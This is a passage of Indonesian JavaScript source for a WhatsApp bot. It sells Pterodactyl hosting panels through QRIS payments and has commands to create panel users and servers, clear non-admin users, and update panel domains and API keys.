            return m.reply('Terjadi kesalahan pada sistem. Silakan coba lagi nanti.');
        }

        // Pastikan pengguna ada di database
        if (!db.users) db.users = {};
        if (!db.users[m.sender]) {
            db.users[m.sender] = {
                status_deposit: false, // Status transaksi default
                balance: 0,           // Saldo awal pengguna
                createdAt: Date.now() // Waktu pendaftaran pengguna
            };
            console.log(`Data pengguna untuk ${m.sender} telah dibuat.`);
        }

        if (m.isGroup) return m.reply("*[ System Notice ]* Pembelian panel hanya bisa dilakukan di private chat.");
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya.");
        }

        const ramPackages = {
            "1gb": { ram: "1000", disk: "1000", cpu: "40", harga: "1000" },
            "2gb": { ram: "2000", disk: "1000", cpu: "60", harga: "2000" },
            "3gb": { ram: "3000", disk: "2000", cpu: "80", harga: "3000" },
            "4gb": { ram: "4000", disk: "2000", cpu: "100", harga: "4000" },
            "5gb": { ram: "5000", disk: "3000", cpu: "120", harga: "5000" },
            "6gb": { ram: "6000", disk: "3000", cpu: "140", harga: "6000" },
            "7gb": { ram: "7000", disk: "4000", cpu: "160", harga: "7000" },
            "8gb": { ram: "8000", disk: "4000", cpu: "180", harga: "8000" },
            "9gb": { ram: "9000", disk: "5000", cpu: "200", harga: "9000" },
            "10gb": { ram: "10000", disk: "5000", cpu: "220", harga: "10000" },
            "unlimited": { ram: "0", disk: "0", cpu: "0", harga: "12000" }
        };

        const teks = `
*#- Detail Ram Yang Tersedia*
* 1gb
* 2gb
* 3gb
* 4gb
* 5gb
* 6gb
* 7gb
* 8gb
* 9gb
* 10gb
* Unlimited

*#- Selalu Berhati - Hati Jika Melakukan Transaksi Terima Kasih*
        `;

        if (!text) return m.reply(teks);

        const cmd = text.toLowerCase();
        const Obj = ramPackages[cmd] || (cmd === "unli" ? ramPackages["unlimited"] : null);
        if (!Obj) return m.reply(teks);

        // Perhitungan harga
        const amount = Number(Obj.harga);
        const fee = Math.floor(Math.random() * 10);
        const totalAmount = amount + fee;

        // Pembuatan pembayaran
        let pay;
        try {
            const paymentResponse = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            pay = await paymentResponse.json();

            if (!pay || !pay.result || !pay.result.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu pembayaran (Jakarta)
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail pembayaran
        const paymentDetails = `*☆ DETAIL TRANSAKSI ☆*

╭——⪼
│• *Id Transaksi* : ${pay.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*☆ Detail Produk Anda ☆*
* [-] Beli Panel Pterodactyl Ram ${Obj.ram}
* [-] Harga : ${amount}
* [-] Ram : ${Obj.ram}
* [-] Cpu : ${Obj.cpu}`;

        const qrMessage = await Aanz.sendMessage(m.chat, {
            image: { url: pay.result.qrImageUrl },
            caption: paymentDetails
        }, { quoted: m });

        // Mengecek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;
        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000;
        const startTime = Date.now();

        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    await Aanz.sendMessage(m.chat, { delete: qrMessage.key });
                    await createPanelServer(Obj, m, totalAmount);
                    isTransactionComplete = true;
                    break;
                }
            } catch (statusError) {
                console.error('Error checking payment status:', statusError);
            }
            await new Promise(resolve => setTimeout(resolve, 10000)); // Delay 10 detik
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buypanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'clearuser': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user
 let f = await fetch(domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearuser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearuser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

    try {
        // Mengambil daftar user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        // Loop melalui setiap user
        for (let user of users) {
            let u = user.attributes;

            // Hanya hapus user yang bukan admin (root_admin = false)
            if (!u.root_admin) {
                let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey3,
                    }
                });

                // Cek status penghapusan user
                if (deleteUser.ok) {
                    m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 3`);
                } else {
                    let errorText = await deleteUser.text();
                    m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 3. Error: ${deleteUser.status} - ${errorText}`);
                }
            }
        }

        m.reply('*Semua user kecuali admin berhasil dihapus dari server 3!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'batalbeli': {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
Aanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Membatalkan Membeli")
} else {
Aanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Menghapus Teks")
}}
break

case 'buyresellerpanel': {
    try {
        // Pastikan db.users adalah objek valid
        if (!db.users) db.users = {};

        // Cek dan inisialisasi data pengguna jika belum ada
        if (!db.users[m.sender]) {
            db.users[m.sender] = { status_deposit: false };
        }

        // Validasi awal: cek apakah perintah dikirim di grup
        if (m.isGroup) {
            return m.reply("*[ System Notice ]* Pembelian reseller panel pterodactyl hanya bisa di dalam private chat.");
        }

        // Cek status deposit pengguna
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
        }

        // Paket reseller panel
        const adminPackages = {
            "permanen": { 
                level: "resellerpanel", 
                access: "Limited", 
                harga: 15000 
            }
        };

        const teks = `
*#- Detail Paket Reseller Panel Tersedia*
* Permanen (Rp. 15.000)

.buyresellerpanel permanen

*#- Selalu Berhati - Hati Jika Melakukan Transaksi Terima Kasih*
        `;
        
        // Jika tidak ada teks yang diberikan, kirim informasi paket
        if (!text) {
            return m.reply(teks);
        }

        const cmd = text.toLowerCase();
        const selectedPackage = adminPackages[cmd];
        if (!selectedPackage) {
            return m.reply(teks);
        }

        // Hitung biaya total
        const amount = Number(selectedPackage.harga);
        const fee = Math.floor(Math.random() * 10); // Biaya admin acak
        const totalAmount = amount + fee;

        // Proses permintaan pembayaran
        let paymentResponse;
        try {
            const paymentRequest = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            paymentResponse = await paymentRequest.json();

            if (!paymentResponse?.result?.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu transaksi
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000); // 5 menit
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail pembayaran
        const paymentDetails = `*DETAIL TRANSAKSI*

╭——⪼
│• *Id Transaksi* : ${paymentResponse.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*☆ Detail Produk Anda ☆*
* [-] Beli Admin Panel Pterodactyl
* [-] Level Akses : ${selectedPackage.level}
* [-] Harga : ${amount}
* [-] Akses : ${selectedPackage.access}`;

        // Kirim QR Code ke pengguna
        const qrMessage = await Aanz.sendMessage(m.chat, { 
            image: { url: paymentResponse.result.qrImageUrl }, 
            caption: paymentDetails 
        }, { quoted: m });

        // API URL untuk mengecek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;

        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Maksimal 5 menit
        const startTime = Date.now();

        // Fungsi untuk notifikasi dana masuk
        const sendFundsNotification = async (transactionDetails) => {
            try {
                await Aanz.sendMessage(m.chat, {
                    text: `*DANA MASUK TERDETEKSI*

*Detail Transaksi:*
• Jumlah: Rp. ${transactionDetails.amount}
• Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Status: Berhasil

* *Berikut Data - Data Reseller Panel*
* *Link : https://chat.whatsapp.com/KzlGNbAVwhMANF5GA92F6H*
* *Expired : Permanen*

Terima kasih telah melakukan transaksi!`,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                });
            } catch (notificationError) {
                console.error('Notification Error:', notificationError);
            }
        };

        // Cek status transaksi
        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    // Hapus pesan QR Code
                    await Aanz.sendMessage(m.chat, { delete: qrMessage.key });

                    // Buat panel reseller untuk pengguna
                    await createAdminPanel(selectedPackage, m, totalAmount);

                    // Kirim notifikasi dana masuk
                    await sendFundsNotification({ amount: totalAmount });

                    isTransactionComplete = true;
                    break;
                }
            } catch (statusError) {
                console.error('Error checking payment status:', statusError);
            }
            await new Promise(resolve => setTimeout(resolve, 10000)); // Delay 10 detik
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buyresellerpanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'buyadminpanel': {
    try {
        if (!m.sender) {
            return m.reply('Pengirim tidak terdeteksi.');
        }

        if (!db.users) {
            db.users = {};
        }

        if (!db.users[m.sender]) {
            db.users[m.sender] = { status_deposit: false };
        }

        // Cek jika ada transaksi yang belum diselesaikan
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
        }

        // Paket admin panel
        const adminPackages = {
            "permanen": { level: "permanen Admin", access: "Limited", harga: "20000" },
            "sebulan": { level: "sebulan Admin", access: "1 Bulan", harga: "10000" }
        };

        const teks = `
*#- Detail Paket Admin Panel Tersedia*
* Permanen (Rp. 20.000)
* Sebulan (Rp. 10.000)
*#- Selalu Berhati-hati jika melakukan transaksi. Terima kasih!*
        `;

        if (!text) return m.reply(teks);

        const cmd = text.toLowerCase();
        const Obj = adminPackages[cmd] || null;
        if (!Obj) return m.reply(teks);

        // Menghitung total biaya
        const amount = Number(Obj.harga);
        const fee = Math.floor(Math.random() * 10); // Biaya admin acak
        const totalAmount = amount + fee;

        // Proses pembayaran
        let pay;
        try {
            const paymentResponse = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            pay = await paymentResponse.json();

            if (!pay || !pay.result || !pay.result.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu transaksi dan format expired time
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000); // 5 menit
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail transaksi
        const paymentDetails = `*DETAIL TRANSAKSI*

╭——⪼
│• *Id Transaksi* : ${pay.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*Detail Produk Anda*
* [-] Beli Admin Panel Pterodactyl
* [-] Level Akses : ${Obj.level}
* [-] Harga : ${amount}
* [-] Akses : ${Obj.access}`;

        // Kirim QR Code ke pengguna
        const qrMessage = await Aanz.sendMessage(m.chat, {
            image: { url: pay.result.qrImageUrl },
            caption: paymentDetails
        }, { quoted: m });

        // Cek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.ApiOrkut}`;

        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Maksimal 5 menit
        const startTime = Date.now();

        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    // Hapus pesan QR Code
                    await Aanz.sendMessage(m.chat, { delete: qrMessage.key });

                    // Buat panel admin untuk pengguna
                    await createAdminPanel(Obj, m, totalAmount);
                    isTransactionComplete = true;
                    break;
                }
            } catch (checkError) {
                console.error('Transaction Check Error:', checkError);
            }

            // Delay 10 detik
            await new Promise(resolve => setTimeout(resolve, 10000));
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buyadminpanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'payment':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `
┌───「 *AanzCuyxzzz-V2* 」───
│ *Dana* : ${global.dana}
│ *Gopay* : ${global.gopay}
│ *Ovo* : ${global.ovo}
└───────────────────
`;

 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case 'done': {
    try {
        // Validasi input
        if (!text) return m.reply('*[ System Notice ]* Format salah! Contoh: .done Nama Barang, Harga, Via Pembayaran');
        const args = text.split(',');
        if (args.length < 3) return m.reply('*[ System Notice ]* Pastikan formatnya sesuai! Contoh: .done Nama Barang, Harga, Via Pembayaran');

        const [namaBarang, harga, viaPembayaran] = args.map(arg => arg.trim());

        // Tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);

        // Link video (GIF)
        const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

        // Format pesan
        const teks = `┌───「 *Detail Transaksi* 」───
│ *Nama Barang*: ${namaBarang}
│ *Harga*: ${harga}
│ *Via Pembayaran* :  ${viaPembayaran}
│ *Tanggal* :  ${formattedDate}
│*Testi* : ${global.link}
└───────────────────
*[INFO]* Terima Kasih Sudah Mempercayai Kami`;

        // Kirim pesan dengan tampilan chat
        await Aanz.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: teks,
            gifPlayback: true,
            gifAttribution: 1,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Transaksi Selesai',
                    body: 'AanzCuyxzzz-V2',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error('Error in done case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'unli-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case 'unli-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case 'updomain3':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain3 = newteks;

 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey3':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey3 = newteks;
 return Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

case 'upcapikey3':{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey3 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;

case 'qris': {
    if (!text) return m.reply('Masukkan nominal, contoh: #deposit 1000');
    const amount = parseInt(text);
    if (isNaN(amount)) return m.reply('Nominal tidak valid. Pastikan hanya angka, contoh: #deposit 1000');

    const fee = Math.floor(Math.random() * 101); // Biaya acak antara 0 - 100
    const totalAmount = amount + fee;

    try {
        // Membuat QRIS
        const pay = await (await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`)).json();

        const expirationTime = new Date(pay.result.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const tek = `*BERIKUT DETAIL PEMBAYARAN*\n\nID TRANSAKSI: ${pay.result.transactionId}\nJUMLAH TRANSAKSI: Rp. ${totalAmount}\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.`;
        await Aanz.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: m });

        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;
        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
        const startTime = new Date().getTime();

        while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
            try {
                const response = await fetch(apiUrl);
